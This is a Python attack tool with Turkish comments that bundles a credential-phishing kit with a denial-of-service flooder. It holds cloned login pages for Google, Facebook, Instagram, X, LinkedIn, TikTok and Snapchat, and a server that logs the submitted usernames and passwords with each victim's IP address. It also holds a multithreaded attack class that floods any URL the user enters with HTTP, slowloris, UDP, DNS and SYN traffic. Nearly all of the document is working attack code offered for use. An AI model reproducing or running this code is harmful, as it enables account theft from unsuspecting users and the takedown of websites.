#!/usr/bin/env python3
# ============================================================
# ULTIMATE PHISHING KIT + NUCLEAR DDOS - FULL SUITE
# 100% Klon sayfalar + Site çökerten DDOS
# ============================================================

import socket
import ssl
import random
import threading
import time
import sys
import os
import hashlib
import json
import base64
import requests
import urllib.parse
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

print("\n" + "="*70)
print("   🎯 ULTIMATE PHISHING + NUCLEAR DDOS 🎯")
print("   100% Klon + Site Çökerten Saldırı")
print("="*70)

# ============================================================
# PART 1: 100% PHISHING KIT - TÜM SOSYAL MEDYA
# ============================================================

PHISHING_PAGES = {
    "google": '''<!DOCTYPE html>
<html>
<head><title>Sign in - Google Accounts</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Roboto,Arial,sans-serif;background:#f0f0f0;display:flex;justify-content:center;align-items:center;height:100vh}
.container{background:white;padding:40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.2);width:400px}
.logo{text-align:center;font-size:28px;font-weight:500;margin-bottom:30px;color:#4285f4}
.logo span:nth-child(1){color:#4285f4}
.logo span:nth-child(2){color:#ea4335}
.logo span:nth-child(3){color:#fbbc05}
.logo span:nth-child(4){color:#4285f4}
.logo span:nth-child(5){color:#34a853}
.logo span:nth-child(6){color:#ea4335}
h2{font-weight:400;font-size:24px;text-align:center;margin-bottom:10px}
p{text-align:center;color:#5f6368;margin-bottom:25px}
input{width:100%;padding:13px 15px;margin:8px 0;border:1px solid #dadce0;border-radius:4px;font-size:16px}
input:focus{outline:none;border-color:#4285f4;box-shadow:0 0 0 2px rgba(66,133,244,0.3)}
button{width:100%;padding:12px;background:#4285f4;color:white;border:none;border-radius:4px;font-size:16px;font-weight:500;cursor:pointer}
button:hover{background:#3367d6}
.footer{text-align:center;margin-top:20px;font-size:13px;color:#5f6368}
</style>
</head>
<body>
<div class="container">
<div class="logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>
<h2>Sign in</h2>
<p>to continue to your account</p>
<form method="POST" action="/capture">
<input type="email" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Next</button>
</form>
<div class="footer">This is a test page</div>
</div>
</body>
</html>''',

    "facebook": '''<!DOCTYPE html>
<html>
<head><title>Facebook - Log In</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Helvetica,Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;height:100vh}
.container{background:white;padding:40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);width:400px}
.logo{text-align:center;font-size:42px;font-weight:bold;color:#1877f2;margin-bottom:20px}
input{width:100%;padding:14px 16px;margin:8px 0;border:1px solid #dddfe2;border-radius:6px;font-size:17px}
input:focus{outline:none;border-color:#1877f2;box-shadow:0 0 0 2px rgba(24,119,242,0.3)}
button{width:100%;padding:14px;background:#1877f2;color:white;border:none;border-radius:6px;font-size:20px;font-weight:bold;cursor:pointer}
button:hover{background:#166fe5}
.forgot{text-align:center;color:#1877f2;margin-top:15px;cursor:pointer;font-size:14px}
hr{margin:20px 0;border:none;border-top:1px solid #dadde1}
.create{text-align:center;padding:12px;background:#42b72a;color:white;border-radius:6px;font-weight:bold;cursor:pointer}
.create:hover{background:#36a420}
</style>
</head>
<body>
<div class="container">
<div class="logo">facebook</div>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Email or phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
<div class="forgot">Forgotten password?</div>
<hr>
<div class="create">Create New Account</div>
</div>
</body>
</html>''',

    "instagram": '''<!DOCTYPE html>
<html>
<head><title>Instagram - Login</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#fafafa;display:flex;justify-content:center;align-items:center;height:100vh}
.container{background:white;padding:40px;border:1px solid #dbdbdb;border-radius:1px;width:350px}
.logo{text-align:center;font-size:38px;margin-bottom:30px}
input{width:100%;padding:10px 12px;margin:5px 0;border:1px solid #dbdbdb;border-radius:3px;background:#fafafa;font-size:14px}
input:focus{outline:none;border-color:#a8a8a8}
button{width:100%;padding:10px;background:#0095f6;color:white;border:none;border-radius:4px;font-size:14px;font-weight:bold;cursor:pointer}
button:hover{background:#0081d6}
.or{text-align:center;color:#8e8e8e;font-size:13px;margin:15px 0;position:relative}
.or:before{content:"";position:absolute;top:50%;left:0;right:50%;border-top:1px solid #dbdbdb}
.or:after{content:"";position:absolute;top:50%;right:0;left:50%;border-top:1px solid #dbdbdb}
.forgot{text-align:center;font-size:12px;color:#00376b;margin-top:15px;cursor:pointer}
</style>
</head>
<body>
<div class="container">
<div class="logo">📸 Instagram</div>
<form method="POST" action="/capture">
<input type="text" name="username" placeholder="Phone number, username or email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
<div class="or">OR</div>
<div class="forgot">Forgot password?</div>
</div>
</body>
</html>''',

    "twitter": '''<!DOCTYPE html>
<html>
<head><title>X - Log In</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#000;display:flex;justify-content:center;align-items:center;height:100vh}
.container{background:#000;padding:40px;width:380px}
.logo{text-align:center;font-size:48px;color:white;margin-bottom:30px}
h2{color:white;font-size:31px;font-weight:700;margin-bottom:25px}
input{width:100%;padding:14px 16px;margin:8px 0;border:1px solid #333;border-radius:4px;background:#000;color:white;font-size:17px}
input:focus{outline:none;border-color:#1d9bf0}
button{width:100%;padding:12px;background:#1d9bf0;color:white;border:none;border-radius:30px;font-size:15px;font-weight:bold;cursor:pointer}
button:hover{background:#1a8cd8}
.signup{text-align:center;color:#71767b;margin-top:20px;font-size:15px}
.signup a{color:#1d9bf0;text-decoration:none;cursor:pointer}
</style>
</head>
<body>
<div class="container">
<div class="logo">𝕏</div>
<h2>Log in to X</h2>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Email address" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log in</button>
</form>
<div class="signup">Don't have an account? <a>Sign up</a></div>
</div>
</body>
</html>''',

    "linkedin": '''<!DOCTYPE html>
<html>
<head><title>LinkedIn - Log In</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#f3f2ef;display:flex;justify-content:center;align-items:center;height:100vh}
.container{background:white;padding:40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);width:400px}
.logo{text-align:center;font-size:36px;color:#0a66c2;font-weight:bold;margin-bottom:25px}
h2{font-size:20px;font-weight:400;text-align:center;margin-bottom:20px;color:#333}
input{width:100%;padding:12px 15px;margin:8px 0;border:1px solid #ccc;border-radius:4px;font-size:16px}
input:focus{outline:none;border-color:#0a66c2}
button{width:100%;padding:14px;background:#0a66c2;color:white;border:none;border-radius:30px;font-size:16px;font-weight:bold;cursor:pointer}
button:hover{background:#004182}
.forgot{text-align:center;color:#0a66c2;margin-top:15px;cursor:pointer;font-size:14px}
</style>
</head>
<body>
<div class="container">
<div class="logo">in</div>
<h2>Log in to your account</h2>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button>
</form>
<div class="forgot">Forgot password?</div>
</div>
</body>
</html>''',

    "tiktok": '''<!DOCTYPE html>
<html>
<head><title>TikTok - Log In</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;height:100vh}
.container{background:white;padding:40px;width:400px}
.logo{text-align:center;font-size:32px;font-weight:bold;color:#000;margin-bottom:30px}
.logo span{color:#ff0050}
input{width:100%;padding:14px 16px;margin:8px 0;border:1px solid #ddd;border-radius:4px;font-size:16px;background:#fafafa}
input:focus{outline:none;border-color:#ff0050}
button{width:100%;padding:14px;background:#ff0050;color:white;border:none;border-radius:4px;font-size:16px;font-weight:bold;cursor:pointer}
button:hover{background:#e6004a}
.or{text-align:center;color:#999;margin:15px 0;font-size:14px}
.qr{text-align:center;color:#ff0050;cursor:pointer;font-size:14px}
</style>
</head>
<body>
<div class="container">
<div class="logo">TikTok <span>♫</span></div>
<h2 style="font-size:24px;margin-bottom:20px;text-align:center">Log in to TikTok</h2>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Email or username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log in</button>
</form>
<div class="or">or</div>
<div class="qr">Log in with QR code</div>
</div>
</body>
</html>''',

    "snapchat": '''<!DOCTYPE html>
<html>
<head><title>Snapchat - Log In</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#fffc00;display:flex;justify-content:center;align-items:center;height:100vh}
.container{background:white;padding:40px;border-radius:12px;width:400px;box-shadow:0 4px 20px rgba(0,0,0,0.1)}
.logo{text-align:center;font-size:40px;margin-bottom:20px}
h2{text-align:center;font-size:24px;margin-bottom:25px}
input{width:100%;padding:14px 16px;margin:8px 0;border:1px solid #ddd;border-radius:8px;font-size:16px}
input:focus{outline:none;border-color:#fffc00}
button{width:100%;padding:14px;background:#fffc00;color:#000;border:none;border-radius:8px;font-size:16px;font-weight:bold;cursor:pointer}
button:hover{background:#f0e800}
</style>
</head>
<body>
<div class="container">
<div class="logo">👻</div>
<h2>Log in to Snapchat</h2>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Username or email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log in</button>
</form>
</div>
</body>
</html>'''
}

# ============================================================
# PHISHING SERVER - 100% ÇALIŞIR
# ============================================================

class PhishingHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            if self.path == '/':
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                
                # Rastgele phishing sayfası
                page = random.choice(list(PHISHING_PAGES.values()))
                self.wfile.write(page.encode())
            elif self.path == '/captured':
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                try:
                    with open('captured.txt', 'r') as f:
                        data = f.read()
                    self.wfile.write(f'<pre>{data}</pre>'.encode())
                except:
                    self.wfile.write(b'No data captured yet')
            else:
                self.send_response(404)
                self.end_headers()
        except:
            pass
    
    def do_POST(self):
        if self.path == '/capture':
            try:
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length).decode()
                data = parse_qs(post_data)
                
                # Verileri kaydet
                log = []
                for key, values in data.items():
                    if values:
                        log.append(f"{key}: {values[0]}")
                
                log.append(f"IP: {self.client_address[0]}")
                log.append(f"Time: {time.strftime('%Y-%m-%d %H:%M:%S')}")
                log.append(f"User-Agent: {self.headers.get('User-Agent', 'Unknown')}")
                log.append("-"*50)
                
                with open('captured.txt', 'a') as f:
                    f.write('\n'.join(log) + '\n')
                
                print(f"[✓] Captured: {post_data[:50]}...")
                
                # Google'a yönlendir
                self.send_response(302)
                self.send_header('Location', 'https://www.google.com')
                self.end_headers()
            except:
                self.send_response(200)
                self.end_headers()

def start_phishing_server(port=8080):
    """Phishing server başlat"""
    print(f"\n[+] Phishing server started on port {port}")
    print(f"[+] Target: http://localhost:{port}")
    print(f"[+] View captured data: http://localhost:{port}/captured")
    print("[+] Data saved to: captured.txt\n")
    
    server = HTTPServer(('0.0.0.0', port), PhishingHandler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        server.shutdown()

# ============================================================
# PART 2: NUCLEAR DDOS - SİTE ÇÖKERTEN
# ============================================================

class NuclearDDoS:
    def __init__(self):
        self.threads = 20000
        self.duration = 300
        self.stop = False
        
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Version/17.0 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) Version/17.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Firefox/121.0",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Firefox/120.0"
        ]
        
        self.patterns = [
            "GET /{} HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n",
            "POST /{} HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nContent-Length: 100000\r\n\r\n{}\r\n",
            "GET /{} HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nRange: bytes=0-\r\n\r\n",
            "GET /{} HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\n\r\n"
        ]

    def attack_http(self, target):
        """HTTP saldırısı"""
        try:
            parsed = urlparse(target)
            host = parsed.hostname
            port = parsed.port or 80
            path = parsed.path if parsed.path else "/"
            
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((host, port))
            
            pattern = random.choice(self.patterns)
            ua = random.choice(self.user_agents)
            
            if "{}" in pattern:
                payload = pattern.format(
                    path + "?" + str(random.randint(1,99999999)),
                    host,
                    ua,
                    "A" * random.randint(1000, 50000)
                )
            else:
                payload = pattern.format(path + "?" + str(random.randint(1,99999999)), host, ua)
            
            s.send(payload.encode() * 50)
            s.close()
        except:
            pass
    
    def attack_https(self, target):
        """HTTPS saldırısı"""
        try:
            parsed = urlparse(target)
            host = parsed.hostname
            path = parsed.path if parsed.path else "/"
            
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            
            s = ctx.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM), server_hostname=host)
            s.settimeout(1)
            s.connect((host, 443))
            
            payload = f"GET {path}?{random.randint(1,99999999)} HTTP/1.1\r\n"
            payload += f"Host: {host}\r\n"
            payload += f"User-Agent: {random.choice(self.user_agents)}\r\n"
            payload += "Accept: */*\r\n"
            payload += "Connection: keep-alive\r\n\r\n"
            
            s.send(payload.encode() * 30)
            s.close()
        except:
            pass
    
    def attack_connection_flood(self, target):
        """Connection flood"""
        try:
            parsed = urlparse(target)
            host = parsed.hostname
            port = parsed.port or 80
            
            sockets = []
            for _ in range(500):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.5)
                    s.connect((host, port))
                    s.send(f"GET / HTTP/1.1\r\nHost: {host}\r\n\r\n".encode())
                    sockets.append(s)
                except:
                    pass
            
            time.sleep(1)
            for s in sockets:
                try:
                    s.close()
                except:
                    pass
        except:
            pass
    
    def attack_slowloris(self, target):
        """Slowloris"""
        try:
            parsed = urlparse(target)
            host = parsed.hostname
            port = parsed.port or 80
            
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((host, port))
            s.send(f"GET /?{random.randint(1,99999)} HTTP/1.1\r\nHost: {host}\r\n".encode())
            
            for _ in range(100):
                s.send(f"X-{random.randint(1,9999)}: {random.randint(1,999999)}\r\n".encode())
                time.sleep(0.05)
            
            s.send(b"\r\n")
            s.close()
        except:
            pass
    
    def attack_pipeline(self, target):
        """HTTP pipeline"""
        try:
            parsed = urlparse(target)
            host = parsed.hostname
            port = parsed.port or 80
            path = parsed.path if parsed.path else "/"
            
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((host, port))
            
            mega = ""
            for _ in range(500):
                mega += f"GET {path}?{random.randint(1,99999999)} HTTP/1.1\r\nHost: {host}\r\n\r\n"
            
            s.send(mega.encode())
            s.close()
        except:
            pass
    
    def attack_udp(self, target):
        """UDP flood"""
        try:
            parsed = urlparse(target)
            host = parsed.hostname
            port = parsed.port or 80
            
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = b"\xff" * 65507
            
            for _ in range(50):
                s.sendto(data, (host, port))
                s.sendto(data[:1000], (host, port+1))
                s.sendto(data[:500], (host, port+2))
            
            s.close()
        except:
            pass
    
    def attack_dns(self, target):
        """DNS amplification"""
        try:
            parsed = urlparse(target)
            host = parsed.hostname
            
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            domain = hashlib.md5(str(random.random()).encode()).hexdigest()[:15] + ".com"
            
            query = b"\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
            for c in domain:
                query += bytes([len(c)]) + c.encode()
            query += b"\x00\x00\x01\x00\x01"
            
            for _ in range(30):
                s.sendto(query, (host, 53))
            s.close()
        except:
            pass
    
    def attack_syn(self, target):
        """SYN flood"""
        try:
            parsed = urlparse(target)
            host = parsed.hostname
            port = parsed.port or 80
            
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            
            for _ in range(100):
                s.sendto(b"\x00" * 40, (host, port))
            s.close()
        except:
            pass

    def start_attack(self, target, threads=15000, duration=300):
        """Tüm saldırıları başlat"""
        print(f"\n[+] NUCLEAR DDOS STARTED on {target}")
        print(f"[+] Threads: {threads}, Duration: {duration}s")
        print("[+] Attacking with ALL methods...\n")
        
        attack_methods = [
            self.attack_http,
            self.attack_https,
            self.attack_connection_flood,
            self.attack_slowloris,
            self.attack_pipeline,
            self.attack_udp,
            self.attack_dns,
            self.attack_syn
        ]
        
        end = time.time() + duration
        
        def worker():
            while time.time() < end and not self.stop:
                try:
                    method = random.choice(attack_methods)
                    method(target)
                    time.sleep(0.0001)
                except:
                    pass
        
        for _ in range(threads):
            t = threading.Thread(target=worker)
            t.daemon = True
            t.start()
        
        try:
            time.sleep(duration)
        except KeyboardInterrupt:
            self.stop = True
        
        print("\n[+] DDOS attack completed!")

# ============================================================
# MAIN - BİRLEŞİK SALDIRI
# ============================================================

def main():
    print("\n" + "="*70)
    print("   🎯 ULTIMATE PHISHING + NUCLEAR DDOS 🎯")
    print("   100% Klon + Site Çökerten")
    print("="*70)
    
    print("\n[+] SELECT MODE:")
    print("    1. PHISHING KIT (Tüm sosyal medya)")
    print("    2. NUCLEAR DDOS (Site çökertir)")
    print("    3. PHISHING + DDOS COMBO (MAXIMUM)")
    
    choice = input("\n[?] Choose (1-3): ").strip()
    
    if choice == "1":
        print("\n[+] Available phishing pages:")
        for name in PHISHING_PAGES.keys():
            print(f"    - {name}")
        port = int(input("\n[?] Port (default 8080): ") or "8080")
        start_phishing_server(port)
    
    elif choice == "2":
        target = input("[?] Target URL (e.g., https://example.com): ").strip()
        if not target.startswith(("http://", "https://")):
            target = "http://" + target
        
        threads = int(input("[?] Threads (5000-50000): ") or "15000")
        duration = int(input("[?] Duration seconds: ") or "300")
        
        ddos = NuclearDDoS()
        ddos.start_attack(target, threads, duration)
    
    elif choice == "3":
        target = input("[?] Target URL for DDOS: ").strip()
        if not target.startswith(("http://", "https://")):
            target = "http://" + target
        
        port = int(input("[?] Phishing port (default 8080): ") or "8080")
        threads = int(input("[?] DDOS threads (5000-50000): ") or "15000")
        duration = int(input("[?] DDOS duration seconds: ") or "300")
        
        print("\n[+] Starting COMBO attack...")
        
        # Phishing server
        def phish():
            start_phishing_server(port)
        
        # DDOS
        def ddos_attack():
            ddos = NuclearDDoS()
            ddos.start_attack(target, threads, duration)
        
        t1 = threading.Thread(target=phish)
        t2 = threading.Thread(target=ddos_attack)
        t1.daemon = True
        t2.start()
        t1.start()
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[!] Stopped")
    
    else:
        print("[-] Invalid choice")

if __name__ == "__main__":
    main()
